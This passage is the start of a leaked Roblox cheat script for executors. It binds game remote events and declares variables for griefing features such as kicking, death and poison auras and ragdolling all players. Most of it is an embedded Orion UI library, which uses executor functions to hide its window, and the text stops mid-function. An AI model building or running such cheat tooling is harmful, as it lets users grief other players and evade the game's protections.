-- leak by deczi, patched by sladostrastnik
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local Struggle = CharacterEvents:WaitForChild("Struggle")
local CreateLine = GrabEvents:WaitForChild("CreateGrabLine")
local DestroyLine = GrabEvents:WaitForChild("DestroyGrabLine")
local DestroyToy = MenuToys:WaitForChild("DestroyToy")

local localPlayer = Players.LocalPlayer
local playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()

localPlayer.CharacterAdded:Connect(function(character)
    playerCharacter = character
end)
local AutoRecoverDroppedPartsCoroutine
local connectionBombReload
local reloadBombCoroutine
local antiExplosionConnection
local poisonAuraCoroutine
local deathAuraCoroutine
local reloadBombCoroutine
local poisonCoroutines = {}
local strengthConnection
local coroutineRunning = false
local autoStruggleCoroutine
local autoDefendCoroutine
local auraCoroutine
local gravityCoroutine
local kickCoroutine
local kickGrabCoroutine
local hellSendGrabCoroutine
local anchoredParts = {}
local anchoredConnections = {}
local compiledGroups = {}
local compileConnections = {}
local compileCoroutine
local fireAllCoroutine
local connections = {}
local renderSteppedConnections = {}
local ragdollAllCoroutine
local crouchJumpCoroutine
local crouchSpeedCoroutine
local anchorGrabCoroutine
local poisonGrabCoroutine
local ufoGrabCoroutine
local burnPart
local fireGrabCoroutine
local noclipGrabCoroutine
local antiKickCoroutine
local kickGrabConnections = {}
local blobmanCoroutine
local lighBitSpeedCoroutine
local lightbitpos = {}
local lightbitparts = {}
local lightbitcon
local lightbitcon2
local lightorbitcon
local bodyPositions = {}
local alignOrientations = {}



local decoyOffset = 15
local stopDistance = 5
local circleRadius = 10
local circleSpeed = 2
local auraToggle = 1
local crouchWalkSpeed = 50
local crouchJumpPower = 50
local kickMode = 1
local auraRadius = 20
local lightbit = 0.3125
local lightbitoffset = 1
local lightbitradius = 20
local usingradius = lightbitradius

local OrionLib = (function()
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")
    local CoreGui = game:GetService("CoreGui")
    local PlayerService = game:GetService("Players")
    local UserService = game:GetService("UserService")

    local LocalPlayer = PlayerService.LocalPlayer
    local Mouse = LocalPlayer:GetMouse()

    local OrionLib = {
        Elements = {},
        ThemeObjects = {},
        Connections = {},
        Flags = {},
        Themes = {
            Default = {
                Main = Color3.fromRGB(25, 25, 25),
                Second = Color3.fromRGB(32, 32, 32),
                Stroke = Color3.fromRGB(60, 60, 60),
                Divider = Color3.fromRGB(60, 60, 60),
                Text = Color3.fromRGB(240, 240, 240),
                TextDark = Color3.fromRGB(150, 150, 150)
            },
        },
        SelectedTheme = "Default",
        Folder = nil,
        SaveCfg = false
    }

    --Feather Icons https://github.com/evoincorp/lucideblox/tree/master/src/modules/util - Created by 7kayoh
    local Icons = {}

    local Success, Response = pcall(function()
        Icons = HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/evoincorp/lucideblox/master/src/modules/util/icons.json")).icons
    end)

    if not Success then
        warn("\nOrion Library - Failed to load Feather Icons. Error code: " .. Response .. "\n")
    end	

    local function GetIcon(IconName)
        if Icons[IconName] ~= nil then
            return Icons[IconName]
        else
            return nil
        end
    end

    local useStudio = RunService:IsStudio() or false

    local Orion = Instance.new("ScreenGui")

    local FocusDrag = nil

    Orion.Name = "Orion"

    getgenv().gethui = function() return game.CoreGui end

    local ProtectGui = protectgui or (syn and syn.protect_gui) or function() end

    local GUIParent = gethui and gethui() or (game.CoreGui or game.Players.LocalPlayer:WaitForChild("PlayerGui"))

    Orion.Parent = GUIParent

    local ProtectGui = protectgui or (syn and syn.protect_gui) or function() end

    ProtectGui(Orion)

    if gethui then
        for _, Interface in ipairs(gethui():GetChildren()) do
            if Interface.Name == Orion.Name and Interface ~= Orion then
                Interface:Destroy()
            end
        end
    else
        for _, Interface in ipairs(game.CoreGui:GetChildren()) do
            if Interface.Name == Orion.Name and Interface ~= Orion then
                Interface:Destroy()
            end
        end
    end

    function OrionLib:IsRunning()
        if gethui then
            return Orion.Parent == gethui()
        else
            return Orion.Parent == game:GetService("CoreGui")
        end

    end

    local function AddConnection(Signal, Function)
        if (not OrionLib:IsRunning()) then
            return
        end
        local SignalConnect = Signal:Connect(Function)
        table.insert(OrionLib.Connections, SignalConnect)
        return SignalConnect
    end

    task.spawn(function()
        while (OrionLib:IsRunning()) do
            wait()
        end

        for _, Connection in next, OrionLib.Connections do
            Connection:Disconnect()
        end
    end)

    local function MakeDraggable(DragPoint, Main)
        pcall(function()
            local Dragging, DragInput, MousePos, FramePos = false
            AddConnection(DragPoint.InputBegan, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    Dragging = true
                    MousePos = Input.Position
                    FramePos = Main.Position

                    Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            Dragging = false
                        end
                    end)
                end
            end)
            AddConnection(DragPoint.InputChanged, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
                    DragInput = Input
                end
            end)
            AddConnection(UserInputService.InputChanged, function(Input)
                if Input == DragInput and Dragging then
                    local Delta = Input.Position - MousePos
                    --TweenService:Create(Main, TweenInfo.new(0.05, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)}):Play()
                    Main.Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)
                end
            end)
        end)
    end    

    local function Create(Name, Properties, Children)
        local Object = Instance.new(Name)
        for i, v in next, Properties or {} do
            Object[i] = v
        end
        for i, v in next, Children or {} do
            v.Parent = Object
        end
        return Object
    end



    local function CreateElement(ElementName, ElementFunction)
        OrionLib.Elements[ElementName] = function(...)
            return ElementFunction(...)
        end
    end

    local function MakeElement(ElementName, ...)
        local NewElement = OrionLib.Elements[ElementName](...)
        return NewElement
    end

    local function SetProps(Element, Props)
        table.foreach(Props, function(Property, Value)
            Element[Property] = Value
        end)
        return Element
    end

    local function SetChildren(Element, Children)
        table.foreach(Children, function(_, Child)
            Child.Parent = Element
        end)
        return Element
    end


    local function Round(Number, Factor)
        local Result = math.floor(Number/Factor + (math.sign(Number) * 0.5)) * Factor
        if Result < 0 then Result = Result + Factor end
        return Result
    end

    local function ReturnProperty(Object)
        if Object:IsA("Frame") or Object:IsA("TextButton") then
            return "BackgroundColor3"
        end 
        if Object:IsA("ScrollingFrame") then
            return "ScrollBarImageColor3"
        end 
        if Object:IsA("UIStroke") then
            return "Color"
        end 
        if Object:IsA("TextLabel") or Object:IsA("TextBox") then
            return "TextColor3"
        end   
        if Object:IsA("ImageLabel") or Object:IsA("ImageButton") then
            return "ImageColor3"
        end   
    end

    local function AddThemeObject(Object, Type)
        if not OrionLib.ThemeObjects[Type] then
            OrionLib.ThemeObjects[Type] = {}
        end    
        table.insert(OrionLib.ThemeObjects[Type], Object)
        Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Type]
        return Object
    end    

    local function SetTheme()
        for Name, Type in pairs(OrionLib.ThemeObjects) do
            for _, Object in pairs(Type) do
                Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Name]
            end    
        end    
    end

    local function PackColor(Color)
        return {R = Color.R * 255, G = Color.G * 255, B = Color.B * 255}
    end    

    local function UnpackColor(Color)
        return Color3.fromRGB(Color.R, Color.G, Color.B)
    end

    local function LoadCfg(Config)
        local Data = HttpService:JSONDecode(Config)
        table.foreach(Data, function(a,b)
            if OrionLib.Flags[a] then
                spawn(function() 
                    if OrionLib.Flags[a].Type == "Colorpicker" then
                        OrionLib.Flags[a]:Set(UnpackColor(b))
                    else
                        OrionLib.Flags[a]:Set(b)
                    end    
                end)
            else
                warn("Orion Library Config Loader - Could not find ", a ,b)
            end
        end)
    end

    local function SaveCfg(Name)
        local Data = {}
        for i,v in pairs(OrionLib.Flags) do
            if v.Save then
                if v.Type == "Colorpicker" then
                    Data[i] = PackColor(v.Value)
                else
                    Data[i] = v.Value
                end
            end	
        end
        writefile(OrionLib.Folder .. "/" .. Name .. ".txt", tostring(HttpService:JSONEncode(Data)))
    end

    local WhitelistedMouse = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3}
    local BlacklistedKeys = {Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Up,Enum.KeyCode.Left,Enum.KeyCode.Down,Enum.KeyCode.Right,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.Escape}

    local freeMouse = Create("TextButton", {Name = "FMouse", Size = UDim2.new(0,0,0,0), BackgroundTransparency = 1, Text = "", Position = UDim2.new(0,0,0,0), Modal = true, Parent = Orion, Visible = false})
    local mouselock = false

    local function UnlockMouse(Value)
        if Value then
            mouselock = true

            task.spawn(function() 
                while mouselock do
                    UserInputService.MouseIconEnabled = Value
                    freeMouse.Visible = Value
                    task.wait()
                end

                UserInputService.MouseIconEnabled = false
                freeMouse.Visible = false
            end)
        else
            mouselock = false
        end
    end

    local function CheckKey(Table, Key)
        for _, v in next, Table do
            if v == Key then
                return true
            end
        end
    end

    CreateElement("Corner", function(Scale, Offset)
        local Corner = Create("UICorner", {
            CornerRadius = UDim.new(Scale or 0, Offset or 10)
        })
        return Corner
    end)

    CreateElement("AspectRatio", function()
        local AspectRatio = Create("UIAspectRatioConstraint")
        return AspectRatio
    end)

    CreateElement("Stroke", function(Color, Thickness)
        local Stroke = Create("UIStroke", {
            Color = Color or Color3.fromRGB(255, 255, 255),
            Thickness = Thickness or 1
        })
        return Stroke
    end)

    CreateElement("List", function(Scale, Offset)
        local List = Create("UIListLayout", {
            SortOrder = Enum.SortOrder.LayoutOrder,
            Padding = UDim.new(Scale or 0, Offset or 0)
        })
        return List
    end)

    CreateElement("Padding", function(Bottom, Left, Right, Top)
        local Padding = Create("UIPadding", {
            PaddingBottom = UDim.new(0, Bottom or 4),
            PaddingLeft = UDim.new(0, Left or 4),
            PaddingRight = UDim.new(0, Right or 4),
            PaddingTop = UDim.new(0, Top or 4)
        })
        return Padding
    end)

    CreateElement("TFrame", function()
        local TFrame = Create("Frame", {
            BackgroundTransparency = 1
        })
        return TFrame
    end)

    CreateElement("Frame", function(Color)
        local Frame = Create("Frame", {
            BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
            BorderSizePixel = 0
        })
        return Frame
    end)

    CreateElement("RoundFrame", function(Color, Scale, Offset)
        local Frame = Create("Frame", {
            BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
            BorderSizePixel = 0
        }, {
            Create("UICorner", {
                CornerRadius = UDim.new(Scale, Offset)
            })
        })
        return Frame
    end)

    CreateElement("Button", function()
        local Button = Create("TextButton", {
            Text = "",
            AutoButtonColor = false,
            BackgroundTransparency = 1,
            BorderSizePixel = 0
        })
        return Button
    end)

    CreateElement("ScrollFrame", function(Color, Width)
        local ScrollFrame = Create("ScrollingFrame", {
            BackgroundTransparency = 1,
            MidImage = "rbxassetid://7445543667",
            BottomImage = "rbxassetid://7445543667",
            TopImage = "rbxassetid://7445543667",
            ScrollBarImageColor3 = Color,
            BorderSizePixel = 0,
            ScrollBarThickness = Width,
            CanvasSize = UDim2.new(0, 0, 0, 0)
        })
        return ScrollFrame
    end)

    CreateElement("Image", function(ImageID)
        local ImageNew = Create("ImageLabel", {
            Image = ImageID,
            BackgroundTransparency = 1
        })

        if GetIcon(ImageID) ~= nil then
            ImageNew.Image = GetIcon(ImageID)
        end	

        return ImageNew
    end)

    CreateElement("ImageButton", function(ImageID)
        local Image = Create("ImageButton", {
            Image = ImageID,
            BackgroundTransparency = 1
        })
        return Image
    end)

    CreateElement("Label", function(Text, TextSize, Transparency)
        local Label = Create("TextLabel", {
            Text = Text or "",
            TextColor3 = Color3.fromRGB(240, 240, 240),
            TextTransparency = Transparency or 0,
            TextSize = TextSize or 15,
            Font = Enum.Font.Gotham,
            RichText = true,
            BackgroundTransparency = 1,
            TextXAlignment = Enum.TextXAlignment.Left
        })
        return Label
    end)

    local NotificationHolder = SetProps(SetChildren(MakeElement("TFrame"), {
        SetProps(MakeElement("List"), {
            HorizontalAlignment = Enum.HorizontalAlignment.Center,
            SortOrder = Enum.SortOrder.LayoutOrder,
            VerticalAlignment = Enum.VerticalAlignment.Bottom,
            Padding = UDim.new(0, 5)
        })
    }), {
        Position = UDim2.new(1, -25, 1, -25),
        Size = UDim2.new(0, 300, 1, -25),
        AnchorPoint = Vector2.new(1, 1),
        Parent = Orion
    })

    function OrionLib:MakeNotification(NotificationConfig)
        spawn(function()
            NotificationConfig.Name = NotificationConfig.Name or "Notification"
            NotificationConfig.Content = NotificationConfig.Content or "Test"
            NotificationConfig.Image = NotificationConfig.Image or "rbxassetid://4384403532"
            NotificationConfig.Time = NotificationConfig.Time or 15

            local NotificationParent = SetProps(MakeElement("TFrame"), {
                Size = UDim2.new(1, 0, 0, 0),
                AutomaticSize = Enum.AutomaticSize.Y,
                Parent = NotificationHolder
            })

            local NotificationFrame = SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(25, 25, 25), 0, 10), {
                Parent = NotificationParent, 
                Size = UDim2.new(1, 0, 0, 0),
                Position = UDim2.new(1, -55, 0, 0),
                BackgroundTransparency = 0,
                AutomaticSize = Enum.AutomaticSize.Y
            }), {
                MakeElement("Stroke", Color3.fromRGB(93, 93, 93), 1.2),
                MakeElement("Padding", 12, 12, 12, 12),
                SetProps(MakeElement("Image", NotificationConfig.Image), {
                    Size = UDim2.new(0, 20, 0, 20),
                    ImageColor3 = Color3.fromRGB(240, 240, 240),
                    Name = "Icon"
                }),
                SetProps(MakeElement("Label", NotificationConfig.Name, 15), {
                    Size = UDim2.new(1, -30, 0, 20),
                    Position = UDim2.new(0, 30, 0, 0),
                    Font = Enum.Font.GothamBold,
                    Name = "Title"
                }),
                SetProps(MakeElement("Label", NotificationConfig.Content, 14), {
                    Size = UDim2.new(1, 0, 0, 0),
                    Position = UDim2.new(0, 0, 0, 25),
                    Font = Enum.Font.GothamSemibold,
                    Name = "Content",
                    AutomaticSize = Enum.AutomaticSize.Y,
                    TextColor3 = Color3.fromRGB(200, 200, 200),
                    TextWrapped = true
                })
            })

            TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 0, 0, 0)}):Play()

            wait(NotificationConfig.Time - 0.88)
            TweenService:Create(NotificationFrame.Icon, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
            TweenService:Create(NotificationFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.6}):Play()
            wait(0.3)
            TweenService:Create(NotificationFrame.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0.9}):Play()
            TweenService:Create(NotificationFrame.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.4}):Play()
            TweenService:Create(NotificationFrame.Content, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.5}):Play()
            wait(0.05)

            NotificationFrame:TweenPosition(UDim2.new(1, 20, 0, 0),'In','Quint',0.8,true)
            wait(1.35)
            NotificationFrame:Destroy()
        end)
    end    

    function OrionLib:Init()
        if OrionLib.SaveCfg then	
            pcall(function()
                if isfile(OrionLib.Folder .. "/" .. game.GameId .. ".txt") then
                    LoadCfg(readfile(OrionLib.Folder .. "/" .. game.GameId .. ".txt"))
                    OrionLib:MakeNotification({
                        Name = "Configuration",
                        Content = "Auto-loaded configuration for the game " .. game.GameId .. ".",
                        Time = 5
                    })
                end
            end)		
        end	
    end

    function OrionLib:MakeWindow(WindowConfig)
        local FirstTab = true
        local Minimized = false
        local Loaded = false
        local UIHidden = false
        

        WindowConfig = WindowConfig or {}
        WindowConfig.Name = WindowConfig.Name or "Orion Library"
        WindowConfig.ConfigFolder = WindowConfig.ConfigFolder or WindowConfig.Name
        WindowConfig.SaveConfig = WindowConfig.SaveConfig or false
        WindowConfig.HidePremium = WindowConfig.HidePremium or false
        if WindowConfig.IntroEnabled == nil then
            WindowConfig.IntroEnabled = true
        end
        WindowConfig.FreeMouse = WindowConfig.FreeMouse or false
        WindowConfig.KeyToOpenWindow = WindowConfig.KeyToOpenWindow or "RightShift"
        WindowConfig.IntroText = WindowConfig.IntroText or "Orion Library"
        WindowConfig.CloseCallback = WindowConfig.CloseCallback or function() end
        WindowConfig.ShowIcon = WindowConfig.ShowIcon or false
        WindowConfig.Icon = WindowConfig.Icon or "rbxassetid://8834748103"
        WindowConfig.IntroIcon = WindowConfig.IntroIcon or "rbxassetid://8834748103"
        OrionLib.Folder = WindowConfig.ConfigFolder
        OrionLib.SaveCfg = WindowConfig.SaveConfig
        if WindowConfig.SaveConfig then
            if not isfolder(WindowConfig.ConfigFolder) then
                makefolder(WindowConfig.ConfigFolder)
            end	
        end

        if WindowConfig.FreeMouse then
            UnlockMouse(true)
        end

        local MobileOpenButton = SetChildren(SetProps(MakeElement("Button"), 
        
        {
            BackgroundTransparency = 0, 
            Parent = Orion, 
            Text =  "Open",
            TextScaled = true,
            TextSize = 14,
            TextColor3 = Color3.new(0, 0, 0),
            BackgroundColor = BrickColor.new(0, 0, 0),
            TextStrokeColor3 = Color3.new(255, 255, 255),
            TextStrokeTransparency = 0,
            Size = UDim2.new(0.035, 0, 0.035, 0),
            AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.new(0.5, 0, 0.5, 0), 
            Visible = false, 
            Font = Enum.Font.GothamBold
        }), {MakeElement("Corner", 0.25), SetProps(MakeElement("AspectRatio"), {DominantAxis = 0, AspectRatio = 0.986, AspectType = 1})})

        MakeDraggable(MobileOpenButton, MobileOpenButton)


        local TabHolder = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 4), {
            Size = UDim2.new(1, 0, 1, -50)
        }), {
            MakeElement("List"),
            MakeElement("Padding", 8, 0, 0, 8)
        }), "Divider")

        AddConnection(TabHolder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
            TabHolder.CanvasSize = UDim2.new(0, 0, 0, TabHolder.UIListLayout.AbsoluteContentSize.Y + 16)
        end)

        local CloseBtn = SetChildren(SetProps(MakeElement("Button"), {
            Size = UDim2.new(0.5, 0, 1, 0),
            Position = UDim2.new(0.5, 0, 0, 0),
            BackgroundTransparency = 1
        }), {
            AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072725342"), {
                Position = UDim2.new(0, 9, 0, 6),
                Size = UDim2.new(0, 18, 0, 18)
            }), "Text")
        })

        local MinimizeBtn = SetChildren(SetProps(MakeElement("Button"), {
            Size = UDim2.new(0.5, 0, 1, 0),
            BackgroundTransparency = 1
        }), {
            AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072719338"), {
                Position = UDim2.new(0, 9, 0, 6),
                Size = UDim2.new(0, 18, 0, 18),
                Name = "Ico"
            }), "Text")
        })

        local DragPoint = SetProps(MakeElement("TFrame"), {
            Size = UDim2.new(1, 0, 0, 50)
        })

        local WindowStuff = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 10), {
            Size = UDim2.new(0, 150, 1, -50),
            Position = UDim2.new(0, 0, 0, 50)
        }), {
            AddThemeObject(SetProps(MakeElement("Frame"), {
                Size = UDim2.new(1, 0, 0, 10),
                Position = UDim2.new(0, 0, 0, 0)
            }), "Second"), 
            AddThemeObject(SetProps(MakeElement("Frame"), {
                Size = UDim2.new(0, 10, 1, 0),
                Position = UDim2.new(1, -10, 0, 0)
            }), "Second"), 
            AddThemeObject(SetProps(MakeElement("Frame"), {
                Size = UDim2.new(0, 1, 1, 0),
                Position = UDim2.new(1, -1, 0, 0)
            }), "Stroke"), 
            TabHolder,
            SetChildren(SetProps(MakeElement("TFrame"), {
                Size = UDim2.new(1, 0, 0, 50),
                Position = UDim2.new(0, 0, 1, -50)
            }), {
                AddThemeObject(SetProps(MakeElement("Frame"), {
                    Size = UDim2.new(1, 0, 0, 1)
                }), "Stroke"), 
                AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
                    AnchorPoint = Vector2.new(0, 0.5),
                    Size = UDim2.new(0, 32, 0, 32),
                    Position = UDim2.new(0, 10, 0.5, 0)
                }), {
                    SetProps(MakeElement("Image", "https://www.roblox.com/headshot-thumbnail/image?userId=".. LocalPlayer.UserId .."&width=420&height=420&format=png"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    }),
                    AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://4031889928"), {
                        Size = UDim2.new(1, 0, 1, 0),
                    }), "Second"),
                    MakeElement("Corner", 1)
                }), "Divider"),
                SetChildren(SetProps(MakeElement("TFrame"), {
                    AnchorPoint = Vector2.new(0, 0.5),
                    Size = UDim2.new(0, 32, 0, 32),
                    Position = UDim2.new(0, 10, 0.5, 0)
                }), {
                    AddThemeObject(MakeElement("Stroke"), "Stroke"),
                    MakeElement("Corner", 1)
                }),
                AddThemeObject(SetProps(MakeElement("Label", LocalPlayer.DisplayName, WindowConfig.HidePremium and 14 or 13), {
                    Size = UDim2.new(1, -60, 0, 13),
                    Position = WindowConfig.HidePremium and UDim2.new(0, 50, 0, 19) or UDim2.new(0, 50, 0, 12),
                    Font = Enum.Font.GothamBold,
                    ClipsDescendants = true
                }), "Text"),
                AddThemeObject(SetProps(MakeElement("Label", "", 12), {
                    Size = UDim2.new(1, -60, 0, 12),
                    Position = UDim2.new(0, 50, 1, -25),
                    Visible = not WindowConfig.HidePremium
                }), "TextDark")
            }),
        }), "Second")

        local WindowName = AddThemeObject(SetProps(MakeElement("Label", WindowConfig.Name, 14), {
            Size = UDim2.new(1, -30, 2, 0),
            Position = UDim2.new(0, 25, 0, -24),
            Font = Enum.Font.GothamBlack,
            TextSize = 20
        }), "Text")

        local WindowTopBarLine = AddThemeObject(SetProps(MakeElement("Frame"), {
            Size = UDim2.new(1, 0, 0, 1),
            Position = UDim2.new(0, 0, 1, -1)
        }), "Stroke")

        local MainWindow = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 10), {
            Parent = Orion,
            Position = UDim2.new(0.5, -307, 0.5, -172),
            Size = UDim2.new(0, 615, 0, 344),
            ClipsDescendants = true
        }), {
            --SetProps(MakeElement("Image", "rbxassetid://3523728077"), {
            --	AnchorPoint = Vector2.new(0.5, 0.5),
            --	Position = UDim2.new(0.5, 0, 0.5, 0),
            --	Size = UDim2.new(1, 80, 1, 320),
            --	ImageColor3 = Color3.fromRGB(33, 33, 33),
            --	ImageTransparency = 0.7
            --}),
            SetChildren(SetProps(MakeElement("TFrame"), {
                Size = UDim2.new(1, 0, 0, 50),
                Name = "TopBar"
            }), {
                WindowName,
                WindowTopBarLine,
                AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 7), {
                    Size = UDim2.new(0, 70, 0, 30),
                    Position = UDim2.new(1, -90, 0, 10)
                }), {
                    AddThemeObject(MakeElement("Stroke"), "Stroke"),
                    AddThemeObject(SetProps(MakeElement("Frame"), {
                        Size = UDim2.new(0, 1, 1, 0),
                        Position = UDim2.new(0.5, 0, 0, 0)
                    }), "Stroke"), 
                    CloseBtn,
                    MinimizeBtn
                }), "Second"), 
            }),
            DragPoint,
            WindowStuff
        }), "Main")

        if WindowConfig.ShowIcon then
            WindowName.Position = UDim2.new(0, 50, 0, -24)
            local WindowIcon = SetProps(MakeElement("Image", WindowConfig.Icon), {
                Size = UDim2.new(0, 20, 0, 20),
                Position = UDim2.new(0, 25, 0, 15)
            })
            WindowIcon.Parent = MainWindow.TopBar
        end	

        MakeDraggable(DragPoint, MainWindow)

        AddConnection(MobileOpenButton.MouseButton1Click, function() 
            MobileOpenButton.Visible = false
            MainWindow.Visible = true
            UIHidden = false
        end)

        local function showMobileOpenButton()
            if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
                if UIHidden then
                    MobileOpenButton.Visible = true
                else
                    MobileOpenButton.Visible = false
                end
            end
        end

        AddConnection(CloseBtn.MouseButton1Up, function()
            MainWindow.Visible = false
            UIHidden = true
            
            if WindowConfig.FreeMouse then
                UnlockMouse(false)
            end
            
            OrionLib:MakeNotification({
                Name = "Interface Hidden",
                Content = "Tap "  .. WindowConfig.KeyToOpenWindow .. " to reopen the interface",
                Time = 3
            })

            showMobileOpenButton()
            WindowConfig.CloseCallback()
        end)

        AddConnection(UserInputService.InputBegan, function(Input, Focus)
            if not Focus then
                if Input.KeyCode == Enum.KeyCode[WindowConfig.KeyToOpenWindow] and UIHidden then
                    MainWindow.Visible = true
                    UIHidden = false
                    if WindowConfig.FreeMouse then
                        UnlockMouse(true)
                    end

                    showMobileOpenButton()
                elseif Input.KeyCode == Enum.KeyCode[WindowConfig.KeyToOpenWindow] and not UIHidden then
                    MainWindow.Visible = false
                    UIHidden = true

                    if WindowConfig.FreeMouse then
                        UnlockMouse(false)
                    end
                    OrionLib:MakeNotification({
                        Name = "Interface Hidden",
                        Content = "Tap "  .. WindowConfig.KeyToOpenWindow .. " to reopen the interface",
                        Time = 3
                    })

                    showMobileOpenButton()
                end
            end
        end)

        AddConnection(MinimizeBtn.MouseButton1Up, function()
            if Minimized then
                TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 615, 0, 344)}):Play()
                MinimizeBtn.Ico.Image = "rbxassetid://7072719338"
                wait(.02)
                MainWindow.ClipsDescendants = false
                WindowStuff.Visible = true
                WindowTopBarLine.Visible = true
            else
                MainWindow.ClipsDescendants = true
                WindowTopBarLine.Visible = false
                MinimizeBtn.Ico.Image = "rbxassetid://7072720870"

                TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, WindowName.TextBounds.X + 140, 0, 50)}):Play()
                wait(0.1)
                WindowStuff.Visible = false	
            end
            Minimized = not Minimized    
        end)

        local function LoadSequence()
            MainWindow.Visible = false
            local LoadSequenceLogo = SetProps(MakeElement("Image", WindowConfig.IntroIcon), {
                Parent = Orion,
                AnchorPoint = Vector2.new(0.5, 0.5),
                Position = UDim2.new(0.5, 0, 0.4, 0),
                Size = UDim2.new(0, 28, 0, 28),
                ImageColor3 = Color3.fromRGB(255, 255, 255),
                ImageTransparency = 1
            })

            local LoadSequenceText = SetProps(MakeElement("Label", WindowConfig.IntroText, 14), {
                Parent = Orion,
                Size = UDim2.new(1, 0, 1, 0),
                AnchorPoint = Vector2.new(0.5, 0.5),
                Position = UDim2.new(0.5, 19, 0.5, 0),
                TextXAlignment = Enum.TextXAlignment.Center,
                Font = Enum.Font.GothamBold,
                TextTransparency = 1
            })

            TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
            wait(0.8)
            TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -(LoadSequenceText.TextBounds.X/2), 0.5, 0)}):Play()
            wait(0.3)
            TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
            wait(2)
            TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
            MainWindow.Visible = true
            LoadSequenceLogo:Destroy()
            LoadSequenceText:Destroy()
        end 

        if WindowConfig.IntroEnabled then
            LoadSequence()
        end	

        if WindowConfig.FreeMouse then
            OrionLib:MakeNotification({
                Name = "Free Mouse mode is on",
                Content = "if you want it to go back to normal, just press M or close the GUI",
                Time = 10
            })
        end

        local TabFunction = {}
        function TabFunction:MakeTab(TabConfig)
            TabConfig = TabConfig or {}
            TabConfig.Name = TabConfig.Name or "Tab"
            TabConfig.Icon = TabConfig.Icon or ""
            TabConfig.PremiumOnly = TabConfig.PremiumOnly or false

            local TabFrame = SetChildren(SetProps(MakeElement("Button"), {
                Size = UDim2.new(1, 0, 0, 30),
                Parent = TabHolder
            }), {
                AddThemeObject(SetProps(MakeElement("Image", TabConfig.Icon), {
                    AnchorPoint = Vector2.new(0, 0.5),
                    Size = UDim2.new(0, 18, 0, 18),
                    Position = UDim2.new(0, 10, 0.5, 0),
                    ImageTransparency = 0.4,
                    Name = "Ico"
                }), "Text"),
                AddThemeObject(SetProps(MakeElement("Label", TabConfig.Name, 14), {
                    Size = UDim2.new(1, -35, 1, 0),
                    Position = UDim2.new(0, 35, 0, 0),
                    Font = Enum.Font.GothamSemibold,
                    TextTransparency = 0.4,
                    Name = "Title"
                }), "Text")
            })

            if GetIcon(TabConfig.Icon) ~= nil then
